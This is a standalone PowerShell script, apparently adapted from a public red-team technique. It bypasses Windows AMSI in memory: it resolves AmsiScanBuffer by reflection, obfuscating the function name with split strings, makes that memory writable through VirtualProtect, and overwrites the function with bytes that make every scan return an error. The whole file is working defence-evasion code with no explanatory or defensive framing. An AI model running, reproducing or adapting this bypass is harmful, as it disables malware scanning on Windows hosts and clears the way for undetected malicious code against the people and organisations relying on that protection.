function LookupFunc {

  Param ($moduleName, $functionName)

  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
  Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
  $tmp=@()
  $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
  return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType {
  Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
  )
  
  $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])

  $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')

  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

  return $type.CreateType()
}
$z1 = 'AmsiS'
$z2 = 'canB'
$z3 = 'uffer'
$z = $z1 + $z2 + $z3
[IntPtr]$funcAddr = LookupFunc amsi.dll $z
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
# in rasta's , arg #2 is "[uint32]5"
$vp.Invoke($funcAddr, [uint32]5, 0x40, [ref]$oldProtectionBuffer)

# original: $buf = [Byte[]] (0x48, 0x31, 0xC0)
$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

# in rasta's, last arg is 6
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 6)
# restore
#$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)